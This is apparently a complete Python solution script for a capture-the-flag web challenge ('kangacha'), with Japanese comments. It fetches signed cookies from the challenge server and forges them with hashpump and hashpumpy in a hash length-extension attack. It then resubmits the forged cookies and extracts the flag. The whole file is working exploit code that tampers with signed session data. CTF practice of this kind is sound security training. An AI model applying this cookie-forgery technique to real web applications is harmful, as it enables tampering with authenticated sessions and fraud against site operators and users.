import hashpumpy
import requests

import subprocess
import re

# セッションを接続するための準備
kangacha_url = "http://ctfq.sweetduet.info:10080/~q31/kangacha.php"
s = requests.Session()

# 一度ポストし、クッキーの情報を得る
r = s.post(kangacha_url, data={"submit": "Gacha"})
r = s.post(kangacha_url, data={"submit": "Gacha"})
data = s.cookies["ship"]
signature = s.cookies["signature"]

# hashpump を subprocess で呼ぶための準備
args = {}
args["data"] = data
args["signature"] = signature
args["key"] = 21
args["append"] = ",10"

cmd = "hashpump -s {signature} -k {key} -d {data} "
cmd += "-a {append}"
cmd = cmd.format(**args)

proc = subprocess.Popen(cmd.strip().split(" "), stdout=subprocess.PIPE)
out, err = proc.communicate()

# 得られた cookie を url エンコードにする
crack_signature, crack_data = out.decode("utf-8").strip().split("\n")
crack_data = crack_data.replace("\\x", "%")

# cookie を変更して再接続
s.cookies.clear()
setargs = {"domain": "ctfq.sweetduet.info", "path": "/~q31"}
s.cookies.set("ship", crack_data, **setargs)
s.cookies.set("signature", crack_signature, **setargs)
r = s.get(kangacha_url)

# Yamato がドロップしているので、フラグ部分を抜き出す。
m = re.search("Yamato \[(?P<flag>.*)\]", r.text)

print(signature)
print(data)
print(crack_signature)
print(crack_data)
print(r.text)
print(m.group("flag"))

sig, mes = hashpumpy.hashpump(signature, data, ',10', 21)

print(sig)
mes = str(mes)[2:-1]
mes = mes.replace("\\x", "%")
print(mes)